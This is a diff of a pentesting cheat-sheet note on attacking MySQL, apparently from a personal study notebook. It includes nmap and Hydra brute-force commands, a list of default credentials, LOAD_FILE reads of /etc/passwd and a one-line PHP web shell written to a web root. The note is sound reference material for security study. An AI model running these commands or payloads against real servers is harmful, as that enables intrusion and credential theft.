@@ -1,52 +1,63 @@
 ---
-created: 23-01-2026
+created: 2026-04-04
 tags:
-  - net_hack
+  - SQL
   - network_services
+  - net_hack
 ---
 ## MySQL
 
- >**[MySQL](https://en.wikipedia.org/wiki/MySQL)** is an open-source relational database management system (RDBMS) that uses SQL (Structured Query Language) to manage and manipulate data. 
+ >**[MySQL](https://en.wikipedia.org/wiki/MySQL)** is an open-source relational database management system (RDBMS) that uses Structured Query Language (SQL) to define, query, and manipulate data. 
 
 - MySQL is the world's most popular open-source RDBMS.
-- By default, MySQL servers listen on **TCP port `3306`**.  
+- It follows a classic **client-server model**:
+	- **Server daemon (`mysqld`)** listens for incoming connections on TCP port `3306` by default. It handles authentication, parses and executes queries, and interacts with the underlying storage engine (usually [InnoDB](https://en.wikipedia.org/wiki/InnoDB)).
+	- **Clients** can be CLI tools like the official [`mysql` client](https://dev.mysql.com/doc/refman/8.4/en/mysql.html) or [`mysqldump`](https://dev.mysql.com/doc/refman/8.4/en/mysqldump.html), applications, ORMs, or scripts.
 
->[!note] In MySQL, a **database** and **schema** are synonymous and are used interchangeably.
+> [!note] In MySQL, the terms **database** and **schema** are synonymous and used interchangeably.
 
 >[!interesting]+ MariaDB
->[MariaDB](https://en.wikipedia.org/wiki/MariaDB) is a fork of the original MySQL code. 
-### Default MySQL databases
+>[MariaDB](https://en.wikipedia.org/wiki/MariaDB) is a community-driven fork of MySQL created after Oracle acquired Sun Microsystems.
+>Although MariaDB started as a drop‑in replacement, the two systems have diverged significantly to the present moment.
 
-MySQL defines several default databases that store its metadata and system information:
+### Default system databases
+
+MySQL ships with several built‑in databases that store metadata, configuration, and system information:
 
 - **`mysql`**
-	- Stores system-level information, such as user accounts, privileges, permissions, password hashes, server configuration, and stored procedures/functions.
-	- Requires elevated privileges for direct access.
+	- The core system database; stores **user accounts** and **authentication data** (including password hashes), **privileges and roles**, **server configuration**, and stored procedures/functions.
+	- Access requires elevated privileges.
 
 - **`information_schema`**
-	- Provides read-only access to metadata about all databases, tables, columns, and other database objects.
-	- The database itself is accessible to **all users** without special privileges, but you can see metadata only for those objects you have permissions to access.
+	- Read-only metadata database; contains information about:
+		- Databases, tables, columns
+		- Constraints, triggers, routines
+		- Character sets and collations
+	- The database itself is accessible to **all users** without special privileges, but each user sees metadata only for those objects they have permissions to access.
 	- Available from MySQL 5.0+; required by the SQL standard.
 
 - **`performance_schema`**
-	- In-memory tables that track server performance metrics, resource usage, query execution statistics, and instrumentation data; used for low-level performance monitoring. 
+	- In-memory database; tracks server performance metrics, including query execution statistics, resource usage, and instrumentation data; used for low-level performance monitoring. 
 
 - **`sys`**
-	- A set of views and stored procedures that provide simplified views of the `performance_schema` and `information_schema` data.
+	- A set of views and stored procedures built on top of `performance_schema` and `information_schema`.
 	- Aggregates complex performance and status data into human-readable and user-friendly formats; useful for quick health checks and diagnostics.
 	- Available from MySQL 5.7+.
+
 ### Authentication
+
+Before being granted access to any database objects, a client must prove its identity to the server.
 
 MySQL supports [multiple authentication methods](https://dev.mysql.com/doc/dev/mysql-server/8.4.6/page_protocol_connection_phase_authentication_methods.html), including:
 
 - `mysql_native_password` (default before MySQL 8.0)
 	- Stores usernames and SHA-1-hashed passwords in `mysql.user` table.
-	- SHA-1 is cryptographically broken and vulnerable to rainbow table attacks.
-	- Still common in legacy systems.
+	- SHA-1 is cryptographically broken and susceptible to rainbow table attacks.
+	- Still common on older Linux servers.
 
-- `caching_sha2_password` (default in MySQL 8.0+)
+- `caching_sha2_password` (default from MySQL 8.0+)
 	- Stores passwords hashed with SHA-256 algorithm.
-	- More resistant to brute-force attacks (but still quite easy to crack having enough time and computational resources).
+	- More resistant to brute-force attacks (but still possible to crack).
 
 - **`auth_socket`**
 	- Unix socket authentication (local connections only).
@@ -57,66 +68,72 @@ MySQL supports [multiple authentication methods](https://dev.mysql.com/doc/dev/m
 	- Integrates with Linux PAM (Pluggable Authentication Modules).
 	- Delegates authentication to system-level mechanisms.
 
-Other supported authentication methods include LDAP, Kerberos, and FIDO (FIDO2/WebAuthn).
+>[!note] MySQL also supports LDAP, Kerberos, FIDO/WebAuth authentication, and custom authentication plugins. 
 
->[!example]+ Example: User creation in MySQL
->```bash
->CREATE USER 'user'@'localhost' IDENTIFIED BY 'password';
->``` 
+## Enumeration
 
-## Reconnaissance
+### Nmap port scanning
 
-### Port scanning
+- Check default MySQL port and run version scan:
 
-- Run default scripts against MySQL port on the target:
+```bash
+sudo nmap -sV -p 3306 <target>
+```
+
+> [!tip]+
+> - Basic port scanning + version detection — in case you suspect non-standard ports:
+> 
+> ```bash
+> sudo nmap -sV -p- <target>
+> ```
+
+- Version detection + default MySQL scripts:
 
 ```bash
 nmap -p 3306 -sV -sC <target_ip>
 ```
 
-- Scan all ports on the target and run MySQL scripts if MySQL is detected on one of the ports:
+- Run all MySQL scripts:
 
 ```bash
-nmap -p- -sV --script mysql-* <target_ip>
+nmap -sV --script mysql-* -p 3306 <target_ip>
 ```
 
->[!note] Although MySQL's default port is `3306`, it can run on any port.
+- Nmap scripts:
 
-### Nmap MySQL scripts
-
-| Script                                                                              | Description                                                                                                                                                                                                                              | Categories                  | Authentication required |
-| ----------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------- | ----------------------- |
-| [`mysql-empty-password`](https://nmap.org/nsedoc/scripts/mysql-empty-password.html) | Checks for empty passwords for `root` or `anonymous`.<br>No authentication required.                                                                                                                                                     | `intrusive`, `auth`         | ❌                       |
-| [`mysql-brute`](https://nmap.org/nsedoc/scripts/mysql-brute.html)                   | Performs credential brute-force; uses `userdb` and `passdb` wordlists.<br>No authentication required.                                                                                                                                    | `intrusive`, `brute`        | ❌                       |
-| [`mysql-enum`](https://nmap.org/nsedoc/scripts/mysql-enum.html)                     | Enumerates valid users on MySQL server.<br>No authentication required.                                                                                                                                                                   | `intrusive`, `brute`        | ❌                       |
-| [`mysql-databases`](https://nmap.org/nsedoc/scripts/mysql-databases.html)           | Attempts to list all databases on a MySQL server.<br>Requires valid MySQL credentials (`SHOW DATABASES` privileges).                                                                                                                     | `discovery`, `intrusive`    | ✅                       |
-| [`mysql-dump-hashes`](https://nmap.org/nsedoc/scripts/mysql-dump-hashes.html)       | Dumps the password hashes from an MySQL server (in a format suitable for cracking with tools like JohnTheRipper). <br>`root` privileges are required.<br>Requires valid MySQL credentials; `root` privileges (`SELECT` on `mysql.user`). | `auth`, `discovery`, `safe` | ✅                       |
-| [`mysql-variables`](https://nmap.org/nsedoc/scripts/mysql-variables.html)           | Attempts to show all variables on a MySQL server.<br>Requires valid MySQL credentials (`SHOW DATABASES` privileges).                                                                                                                     | `discovery`, `intrusive`    | ✅                       |
-| [`mysql-query`](https://nmap.org/nsedoc/scripts/mysql-query.html)                   | Runs a query against a MySQL database and returns the results as a table.<br>Requires valid MySQL credentials.                                                                                                                           | `auth`, `discovery`, `safe` | ✅                       |
+| Script                                                                              | Description                                                                                                                                                                                                                              | Categories                  | Requires authentication? ] |
+| ----------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------- | -------------------------- |
+| [`mysql-empty-password`](https://nmap.org/nsedoc/scripts/mysql-empty-password.html) | Checks for empty passwords for `root` or `anonymous`.<br>No authentication required.                                                                                                                                                     | `intrusive`, `auth`         | ❌                          |
+| [`mysql-brute`](https://nmap.org/nsedoc/scripts/mysql-brute.html)                   | Performs credential brute-force; uses `userdb` and `passdb` wordlists.<br>No authentication required.                                                                                                                                    | `intrusive`, `brute`        | ❌                          |
+| [`mysql-enum`](https://nmap.org/nsedoc/scripts/mysql-enum.html)                     | Enumerates valid users on MySQL server.<br>No authentication required.                                                                                                                                                                   | `intrusive`, `brute`        | ❌                          |
+| [`mysql-databases`](https://nmap.org/nsedoc/scripts/mysql-databases.html)           | Attempts to list all databases on a MySQL server.<br>Requires valid MySQL credentials (`SHOW DATABASES` privileges).                                                                                                                     | `discovery`, `intrusive`    | ✅                          |
+| [`mysql-dump-hashes`](https://nmap.org/nsedoc/scripts/mysql-dump-hashes.html)       | Dumps the password hashes from an MySQL server (in a format suitable for cracking with tools like JohnTheRipper). <br>`root` privileges are required.<br>Requires valid MySQL credentials; `root` privileges (`SELECT` on `mysql.user`). | `auth`, `discovery`, `safe` | ✅                          |
+| [`mysql-variables`](https://nmap.org/nsedoc/scripts/mysql-variables.html)           | Attempts to show all variables on a MySQL server.<br>Requires valid MySQL credentials (`SHOW DATABASES` privileges).                                                                                                                     | `discovery`, `intrusive`    | ✅                          |
+| [`mysql-query`](https://nmap.org/nsedoc/scripts/mysql-query.html)                   | Runs a query against a MySQL database and returns the results as a table.<br>Requires valid MySQL credentials.                                                                                                                           | `auth`, `discovery`, `safe` | ✅                          |
 **No authentication required:**
 
 - `mysql-empty-password`: Check for empty `root` password:
 
 ```bash
-nmap -p 3306 --script mysql-empty-password <target_ip_address>
+nmap -p 3306 --script mysql-empty-password <target>
 ```
 
 - `mysql-enum`: Enumerate valid MySQL users:
 
 ```bash
-nmap -p 3306 --script mysql-enum <target_ip_address>
+nmap -p 3306 --script mysql-enum <target>
 ```
 
 - `mysql-brute`: Check for weak passwords:
 
 ```bash
-nmap -p 3306 --script mysql-brute <target_ip_address>
+nmap -p 3306 --script mysql-brute <target>
 ```
 
 ```bash
 # custom wordlist
 nmap -p 3306 --script mysql-brute \
---script-args userdb=users.txt,passdb=passes.txt <target_ip_address>
+--script-args userdb=users.txt,passdb=passes.txt <target>
 ```
 
 **Authentication required:**
@@ -146,50 +163,110 @@ nmap -p 3306 --script mysql-query \
 --script-args mysqluser=root,mysqlpass=password,query="SELECT user,host FROM mysql.user" <target_ip>
 ```
 
+### Banner grabbing
+
+- Connect using Netcat:
+
+```bash
+nc -vn <target> 3306
+```
+
+- Or Telnet:
+
+```bash
+telnet <target> 3306
+```
+
+
 ## Connecting to MySQL
 
 ### `mysql` client
 
-- To connect to a MySQL database from Linux, use the `mysql` command:
+- Connect with no password:
 
 ```bash
-mysql -h <target_ip_address> -u <username> -p<password> 
+mysql -h <target> -u <username>
+```
+
+>[!note] If you don't specify the host, `mysql` falls back to `localhost`.
+
+- Connect with username and password:
+
+```bash
+mysql -h <target> -u <username> -p<password> 
 ```
 
 >[!note] There shouldn't be a space between `-p` and the password.
 
-- If you don't specify the host, `mysql` will fall back to the default `localhost`.
-
-- For an interactive password prompt, leave `<password>` empty:
+- Interactive password prompt:
 
 ```bash
-mysql -h <target_ip_address> -u <username> -p
+mysql -h <target> -u <username> -p
 ```
 
->[!note] The default port is `3306`.
+>[!tip]+
+> - Common default credentials to try (see [`SecLists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt`](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt)):
+> 
+> ```bash
+> root:mysql
+> root:root
+> root:chippc
+> admin:admin
+> root:
+> root:nagiosxi
+> root:usbw
+> cloudera:cloudera
+> root:cloudera
+> root:moves
+> moves:moves
+> root:testpw
+> root:p@ck3tf3nc3
+> mcUser:medocheck123
+> root:mktt
+> root:123
+> dbuser:123
+> asteriskuser:amp109
+> asteriskuser:eLaStIx.asteriskuser.2oo7
+> root:raspberry
+> root:openauditrootuserpassword
+> root:vagrant
+> root:123qweASD#
+> ```
 
-- Specify a custom port:
+- Specify a custom port (default is `3306`):
 
 ```bash
-mysql -h <target_ip_address> -P <port> -u <username> -p<password>
+mysql -h <target> -P <port> -u <username> -p<password>
 ```
 
-- Connect and execute a query
+- Connect to a specific database:
 
 ```bash
-mysql -u username -p -e "SELECT @@version;"
+mysql -h <target> -u <username> <database_name>
 ```
 
 - Connect without selecting a database:
 
 ```bash
-mysql -u username -h target.com -p --skip-database
+mysql -u username -h <target> -p --skip-database
+```
+
+- Connect and execute a query:
+
+```bash
+mysql -h <target> -u username -p -e "SELECT @@version;"
 ```
 
 - Check if TLS is enabled:
 
 ```bash
-mysql -h <target_ip_address> -u <username> -p --ssl-mode=REQUIRED
+mysql -h <target> -u <username> -p --ssl-mode=REQUIRED
+```
+
+- Skip TLS/SSL:
+
+```bash
+mysql -h <target> -u <username> -p --skip-ssl
 ```
 
 - Attempt a Unix socket connection (local only):
@@ -197,130 +274,52 @@ mysql -h <target_ip_address> -u <username> -p --ssl-mode=REQUIRED
 ```bash
 mysql -u <username> -S /var/run/mysqld/mysqld.sock
 ```
-### Python
 
-- To connect to a MySQL database using Python, you can use the `mysql.connector` module:
+## Credential brute-force 
 
-```Python
-import mysql.connector
+Dictionary attacks with Hydra:
 
-conn = mysql.connector.connect(
-    host='192.168.1.11',
-    user='root',
-    password='password',
-    database='mysql'
-)
-cursor = conn.cursor()
-cursor.execute("SELECT @@version")
-print(cursor.fetchone())
-conn.close()
+- Password brute-force for one user (`root`):
+
+```bash
+hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<target>
 ```
 
-### PHP
+- Password brute-force for multiple users:
 
-```PHP
-<?php
-$mysqli = new mysqli('192.168.1.11', 'root', 'password', 'mysql');
-if ($mysqli->connect_error) {
-    die("Connection failed: " . $mysqli->connect_error);
-}
-$result = $mysqli->query("SELECT @@version");
-echo $result->fetch_row()[0];
-$mysqli->close();
-?>
+```bash
+hydra -L users.txt -P passwords.txt mysql://<target>
 ```
 
-### Java 
+- Specify a custom port:
 
-```Java
-import java.sql.*;
-
-public class MySQLConnect {
-    public static void main(String[] args) {
-        try {
-            Class.forName("com.mysql.cj.jdbc.Driver");
-            Connection conn = DriverManager.getConnection(
-                "jdbc:mysql://192.168.1.100:3306/mysql",
-                "root", "password"
-            );
-            Statement stmt = conn.createStatement();
-            ResultSet rs = stmt.executeQuery("SELECT @@version");
-            if (rs.next()) {
-                System.out.println(rs.getString(1));
-            }
-            conn.close();
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-}
-```
-## Enumeration
-### Version detection
-
-- MySQL version:
-
-```SQL
-SELECT @@version;
+```bash
+hydra -l root -P passwords.txt -s 3307 mysql://<target>
 ```
 
-```SQL
-SELECT VERSION();
+- Specify the number of threads to use:
+
+```bash
+hydra -l root -P passwords.txt -t 4 mysql://<target>
 ```
 
-```SQL
-SELECT @@global.version;
-```
+> [!note] MySQL has no built-in account lockout by default, but some hardened configurations or connection plugins may block repeated failures. Keep thread count low (`-t 4`) on engagements to avoid noise.
 
->[!example]
->```SQL
->SELECT @@version;
->```
->```
->10.11.11-MariaDB-0+deb12u1
->```
+## MySQL enumeration
 
-- [InnoDB](https://en.wikipedia.org/wiki/InnoDB) storage engine version:
+### Version and server information
 
-```
-@@innodb_version;
-```
+| Command                             | Description                                                            |
+| ----------------------------------- | ---------------------------------------------------------------------- |
+| `SELECT @@version;`                 | MySQL/MariaDB server version.                                          |
+| `SELECT VERSION();`                 | Server version (function form).                                        |
+| `SELECT @@global.version;`          | Global server version variable.                                        |
+| `@@innodb_version;`                 | [InnoDB](https://en.wikipedia.org/wiki/InnoDB) storage engine version. |
+| `SELECT @@version_compile_os;`      | The OS used to compile the server.                                     |
+| `SELECT @@version_compile_machine;` | The CPU architecture used for compilation.                             |
+| `SHOW VARIABLES LIKE "%version%";`  | Search for version-related server variables.                           |
 
-- Server software information:
-
-```SQL
-SELECT @@version_compile_os;
-```
-
-```SQL
-SELECT @@version_compile_machine;
-```
-
->[!example]+
-> ```SQL
-> SELECT @@version_compile_os;
-> ```
-> 
-> ```
-> debian-linux-gnu
-> ```
-
->[!example]+
-> ```SQL
-> SELECT @@version_compile_machine;
-> ```
-> 
-> ```
-> x86_64
-> ```
-
-- Search for version variables:
-
-```SQL
-SHOW VARIABLES LIKE "%version%";
-```
-
-- Query to output multiple variables at once:
+- Query multiple variables at once:
 
 ```SQL
 SELECT 
@@ -332,31 +331,17 @@ SELECT
     @@character_set_server AS 'Character Set',
     @@collation_server AS 'Collation';
 ```
-### Databases
 
-- List databases ([`SHOW DATABASES`](https://dev.mysql.com/doc/refman/8.4/en/show-databases.html)): 
+### Databases 
 
-```SQL
-SHOW DATABASES;
-```
+| Command                                                | Description                                                      |
+| ------------------------------------------------------ | ---------------------------------------------------------------- |
+| `SHOW DATABASES;`                                      | List all databases visible to the current user.                  |
+| `SELECT schema_name FROM information_schema.SCHEMATA;` | List all databases using `information_schema` (metadata tables). |
+| `SELECT DATABASE();`                                   | Show the currently selected database.                            |
+| `USE users;`                                           | Switches to a specific database.                                 |
 
-```SQL
-SELECT schema_name FROM information_schema.SCHEMATA;
-```
-
-- Show current database:
-
-```SQL
-SELECT DATABASE();
-```
-
-- Switch database:
-
-```SQL
-USE users;
-```
-
-- Database size:
+- Calculate database size in MB:
 
 ```SQL
 SELECT
@@ -371,33 +356,17 @@ GROUP BY table_schema;
 ```SQL
 SELECT table_schema, COUNT(*) FROM information_schema.tables GROUP BY table_schema;
 ```
+
 ### Tables and columns
 
-- List tables in the current database:
 
-```SQL
-SHOW TABLES;
-```
-
-```SQL
-SELECT table_name FROM information_schema.TABLES WHERE table_schema=DATABASE()' 
-```
-
-- Show table structure:
-
-```SQL
-DESCRIBE <table_name>;
-```
-
-- List columns in a specific table:
-
-```SQL
-SHOW COLUMBS FROM table_name;
-```
-
-```SQL
-SELECT column_name, data_type FROM information_schema.COLUMNS WHERE table_name='users';
-```
+| Command                                                                                   | Description                                                           |
+| ----------------------------------------------------------------------------------------- | --------------------------------------------------------------------- |
+| `SHOW TABLES;`                                                                            | List tables in the current database.                                  |
+| `SELECT table_name FROM information_schema.TABLES WHERE table_schema=DATABASE()`          | List tables using `information_schema` (metadata tables).             |
+| `DESCRIBE table_name;`                                                                    | Show table structure and column definitions.                          |
+| `SHOW COLUMNS FROM table_name;`                                                           | List columns in a table.                                              |
+| `SELECT column_name, data_type FROM information_schema.COLUMNS WHERE table_name='users';` | List columns in a table using `information_schema` (metadata tables). |
 
 - Find sensitive columns:
 
@@ -410,79 +379,32 @@ WHERE column_name LIKE '%password%'
 	OR column_name LIKE '%token%'
 ```
 
-
-- Count rows in tables:
+- Count rows for all tables in the current database:
 
 ```SQL
 SELECT table_name, table_rows FROM information_schema.TABLES WHERE table_schema = DATABASE();
 ```
 ### Users
 
-- Get the current MySQL user:
-
-```SQL
-SELECT USER();
-```
-
-```SQL
-SELECT CURRENT_USER();
-```
-
-- List MySQL users:
-
-```SQL
-SELECT user,host FROM mysql.user;
-```
-
+| Command                             | Description                                           |
+| ----------------------------------- | ----------------------------------------------------- |
+| `SELECT USER();`                    | Show currently authenticated user (may include host). |
+| `SELECT CURRENT_USER();`            | Show current user.                                    |
+| `SELECT user,host FROM mysql.user;` | List MySQL accounts and their host restrictions.      |
 ### Privileges
 
-- Check user privileges:
-
-
-```SQL
-SHOW GRANTS;
-```
-
-```SQL
-SELECT grantee, privilege_type FROM information_schema.user_privileges
-```
-
-
-- Show privileges for a specific user:
-
-```SQL
-SHOW GRANTS FOR 'username'@'host';
-```
-
-```SQL
-SELECT * FROM information_schema.user_privileges WHERE grantee LIKE '%username%';
-```
-
-```SQL
-SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee="'username'@'host'"
-```
-
+| Command                                                                             | Description                                                                       |
+| ----------------------------------------------------------------------------------- | --------------------------------------------------------------------------------- |
+| `SHOW GRANTS;`                                                                      | Show privileges for the current user.                                             |
+| `SHOW GRANTS FOR 'username'@'host';`                                                | Show privileges for a specific user.                                              |
+| `SELECT * FROM information_schema.user_privileges WHERE grantee LIKE '%username%';` | Show privileges for a specific user using `information_schema` (metadata tables). |
+| `SELECT grantee, privilege_type FROM information_schema.user_privileges`            | List privileges for all users using `information_schema` (metadata tables).       |
+| `SELECT user, host FROM mysql.user WHERE File_priv = 'Y';`                          | List users with the `FILE` privilege.                                             |
+| `SELECT user, host FROM mysql.user WHERE Super_priv = 'Y';`                         | List users with the `SUPER` privilege.                                            |
+| `SELECT super_priv FROM mysql.user WHERE user="username"`                           | Check if the user has superuser privileges.                                       |
 >[!note] `Y` in the response means `YES`.
 
-- List users with the `FILE` privilege:
-
-```SQL
-SELECT user, host FROM mysql.user WHERE File_priv = 'Y';
-```
-
-- List users with the `SUPER` privilege:
-
-```SQL
-SELECT user, host FROM mysql.user WHERE Super_priv = 'Y';
-```
-
-- Check if the user has superuser privileges:
-
-```SQL
-SELECT super_priv FROM mysql.user WHERE user="username"
-```
-
-- Check for dangerous privileges:
+- Display key privilege flags for all users:
 
 ```SQL
 SELECT user, host, Select_priv, Insert_priv, Update_priv, Delete_priv,  
@@ -492,136 +414,63 @@ FROM mysql.user;
 
 ### Configuration and system variables
 
-- List variables:
-
-```SQL
-SHOW VARIABLES;
-```
-
-- File operations directory (where MySQL can read files using `LOAD DATA INFILE` or write files using `SELECT ... INTO OUTFILE`):
-
-```SQL
-SHOW VARIABLES LIKE 'secure_file_priv';
-```
-
-- Plugin directory (where MySQL can load functions from):
-
-```SQL
-SHOW VARIABLES LIKE 'plugin_dir';
-```
-
-- Data directory (where MySQL stores databases, tables, log files, and other critical server data):
-
-```bash
-SHOW VARIABLES LIKE 'datadir';
-```
-
-- Base directory (path to the MySQL installation directory):
-
-```SQL
-SHOW VARIABLES LIKE 'basedir';
-```
-
-- Check if `local_infile` is enabled (controls the ability to use `LOAD DATA LOCAL INFILE` statements):
-
-```SQL
-SHOW VARIABLES LIKE 'local_infile';
-```
-
-- Process list (information about the threads currently executing within the MySQL server):
-
-```SQL
-SHOW PROCESSLIST;
-```
-
-```SQL
-SELECT * FROM information_schema.PROCESSLIST;
-```
-## Credential brute-force 
-
-Dictionary attacks with Hydra:
-
-- Password brute-force for one user (`root`):
-
-```bash
-hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<target_ip_address>
-```
-
-- Password brute-force for multiple users:
-
-```bash
-hydra -L users.txt -P passwords.txt mysql://<target_ip_address>
-```
-
-- Specify a custom port:
-
-```bash
-hydra -l root -P passwords.txt -s 3307 mysql://<target_ip_address>
-```
-
-- Specify the number of threads to use:
-
-```bash
-hydra -l root -P passwords.txt -t 4 mysql://<target_ip_address>
-```
-
-- Common default credentials to try (see [`SecLists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt`](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt)):
-
-```bash
-root:mysql
-root:root
-root:chippc
-admin:admin
-root:
-root:nagiosxi
-root:usbw
-cloudera:cloudera
-root:cloudera
-root:moves
-moves:moves
-root:testpw
-root:p@ck3tf3nc3
-mcUser:medocheck123
-root:mktt
-root:123
-dbuser:123
-asteriskuser:amp109
-asteriskuser:eLaStIx.asteriskuser.2oo7
-root:raspberry
-root:openauditrootuserpassword
-root:vagrant
-root:123qweASD#
-```
+| Command                                         | Description                                                                                                                              |
+| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
+| `SHOW VARIABLES;`                               | List all server configuration variables.                                                                                                 |
+| `SHOW VARIABLES LIKE 'secure_file_priv';`       | Show the file operations directory (where MySQL can read files using `LOAD DATA INFILE` or write files using `SELECT ... INTO OUTFILE`). |
+| `SHOW VARIABLES LIKE 'plugin_dir';`             | Show the plugin directory (where MySQL can load functions from).                                                                         |
+| `SHOW VARIABLES LIKE 'datadir';`                | Show the data directory (where MySQL stores databases, tables, log files, and other critical server data).                               |
+| `SHOW VARIABLES LIKE 'basedir';`                | Show the base directory (path to the MySQL installation directory).                                                                      |
+| `SHOW VARIABLES LIKE 'local_infile';`           | Check if `local_infile` is enabled (controls te ability to use `LOAD DATA LOCAL INFILE`).                                                |
+| `SHOW PROCESSLIST;`                             | Display process list (information about the threads currently executing within the MySQL server).                                        |
+| `SELECT * FROM information_schema.PROCESSLIST;` | Display process list using `information_schema` (metadata tables).                                                                       |
 
 ## File system operations
-### Reading local files
 
-- Read content of a local file into the database:
+### secure_file_priv
+
+>[!important] You can read or write files from MySQL only if the `secure_file_priv` variable is not `NULL`.
+
+- Check the `secure_file_priv` variable:
 
 ```SQL
-SELECT * LOAD_FILE('/etc/passwd')
+SELECT @@secure_file_priv;
 ```
 
+```SQL
+SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
+```
+
+- Possible values:
+	- `NULL`: File operations are completely disabled (most secure, default in MySQL 8.0+).
+	- `''` (empty string): No restrictions — any file the MySQL process can read is accessible (insecure; default in MySQL 5.5 and earlier).
+	- Specific directory path (e.g., `/var/lib/mysql-files`): Read/write allowed only within that specific directory.
+
 >[!important] To perform file operations, your user must have the `FILE` privilege.
+
+- Show privileges for the current user:
+
+```sql
+SHOW GRANTS;
+```
+
+### Reading local files
+
+
+> **`LOAD_FILE()`** is a MySQL built-in string function that reads the contents of a file from the server's local filesystem and returns it as a string, or `NULL` if the file can't be read.
+
+- Read `/etc/passwd`:
+
+```SQL
+SELECT LOAD_FILE('/etc/passwd')
+```
+
 
 - The file must be located on the **same host where MySQL server is running** (only local files), and the **full path** must be specified.
 - The file must be readable by the MySQL process user (or by all users).
 - File location must satisfy the `secure_file_priv` restriction.
 - File size must be less than `max_allowed_packet`.
 
->[!note]+ `secure_file_priv`
->- Check the `secure_file_priv` value:
->```SQL
->SELECT @@secure_file_priv;
->```
->```SQL
-> SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
-> ```
->`secure_file_priv` values:
->- `NULL`: File operations are completely disabled (most secure, default in MySQL 8.0+).
->	- In this case, `LOAD DATA INFILE` will fail with: `The MySQL server is running with the --secure-file-priv option so it cannot execute this statement`.
->- `''` (empty string): No restrictions — any file the MySQL process can read is accessible (insecure; default in MySQL 5.5 and earlier).
->- Specific directory path: Files can be read only from the specified directory. 
 
 >[!note]+ `max_allowed_packet`
 >- Check `max_allowed_packet`:
@@ -630,9 +479,32 @@ SELECT * LOAD_FILE('/etc/passwd')
 >```
  The file contents is returned as a string value in query results. If the file does not exist or cannot be read because one of the preceding conditions is not satisfied, the function returns `NULL`.
 
+
+- There's also a [`LOAD DATA`](https://dev.mysql.com/doc/refman/8.4/en/load-data.html), which imports file contents into table rows rather than returning them directly:
+
+```sql
+-- Load /etc/passwd into a table row by row
+CREATE TABLE loot (line TEXT);
+LOAD DATA INFILE '/etc/passwd' INTO TABLE loot;
+SELECT * FROM loot;
+```
+
+- The database user you're running as must have the `FILE` privilege.
+- MySQL process user (typically `mysql`) must have read permissions on the file.
+- File location must satisfy `secure_file_priv` restriction.
+
+>[!important] `LOAD_FILE()` returns file contents as a query result; `LOAD DATA` populates table rows with file contents.
+
+> [!note] There's also a `LOAD DATA LOCAL INFILE` variant that reads from the _client's_ filesystem rather than the server's. This is controlled by the `local_infile` variable and is a separate attack surface — particularly relevant in SQL injection scenarios where you're acting as the client.
+
+>[!tip]+ 
+>- [`FROM_BASE64()`](https://dev.mysql.com/doc/refman/8.4/en/string-functions.html#function_from-base64) takes a Base64-encoded string and returns the recorded results as a binary string.
+>- [`TO_BASE64()`](https://dev.mysql.com/doc/refman/8.4/en/string-functions.html#function_to-base64) is a reverse operation: it takes a string to Base64-encoded form and returns the result.
 ### Writing files
 
-In MySQL, you can write files using the [`SELECT ... INTO OUTFILE`](https://dev.mysql.com/doc/refman/8.4/en/select-into.html) statement. It writes the selected rows to a file.
+> **[`SELECT ... INTO OUTFILE`](https://dev.mysql.com/doc/refman/8.4/en/select-into.html) ** is a MySQL statement extension that writes the result set of a `SELECT` query into a file on the server's filesystem, with fields and rows delimited by configurable separators.
+
+> **`SELECT ... INTO DUMPFILE`** writes the raw, undelimited binary content of a single-row, single-column result set into a file — used when byte-perfect output is required, such as when writing binary payloads.
 
 - Write a basic PHP web shell:
 
@@ -649,7 +521,6 @@ SELECT '<?php system($_GET["cmd"]); ?>' INTO DUMPFILE '/var/www/html/shell.php';
 ```SQL
 SELECT * FROM users INTO OUTFILE '/tmp/file.txt'
 ```
-
 
 >[!important] To perform file operations, your user must have the `FILE` privilege.
 
@@ -668,21 +539,7 @@ SELECT * FROM users INTO OUTFILE '/tmp/file.txt'
 	- `/usr/share/nginx/html/`
 	- `/home/username/public_html/`
 
-- If you were able to upload a file to a web root, you might be able to access it from the website, e.g., via `http://target_ip_address/shell.php?cmd=whoami`.
-
-## Command execution
-
-- Spawn a shell:
-
-```bash
-/!sh
-```
-
-- Execute a command:
-
-```SQL
-SELECT sys_exec('id');
-```
+- If you were able to upload a file to a web root, you might be able to access it from the website, e.g., via `http://target/shell.php?cmd=whoami`.
 
 ## Privilege escalation through User-Defined Functions (UDF)
 
@@ -695,9 +552,6 @@ SELECT sys_exec('id');
 - If a UDF crashes, MySQL crashes. 
 
 A developer might create a UDF for custom cryptographic functions or specialized math and analytics — and use it just like any built-in MySQL functoin (e.g., `ABS()` or `CONCAT()`). But from an attacker's perspective, UDFs is literally injecting arbitrary C code execution into the database engine.
-
-
-
 ### Privilege escalation via UDFs
 
 >[!important]+ On MySQL versions and UDF support
@@ -837,23 +691,4 @@ hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
 
 - [`MySQL User Defined Functions — Linux Privilege Escalation — Juggernaut Pentesting Academy`](https://juggernaut-sec.com/mysql-user-defined-functions/)
 
-## Drafts
 
-
-
-- There's also a [`LOAD DATA`](https://dev.mysql.com/doc/refman/8.4/en/load-data.html) statement in MySQL. It can be used to import file contents into database table rows, where you can read it:
-
-```SQL
-LOAD DATA INFILE '/etc/passwd' iNTO TABLE table_name
-```
-
-- The database user you're running as must have the `FILE` privilege.
-- MySQL process user (typically `mysql`) must have read permissions on the file.
-- File location must satisfy `secure_file_priv` restriction.
-
->[!important] `LOAD_FILE()` returns file data in query results, while `LOAD DATA` populates table rows with file contents.
-
-
->[!tip]+ 
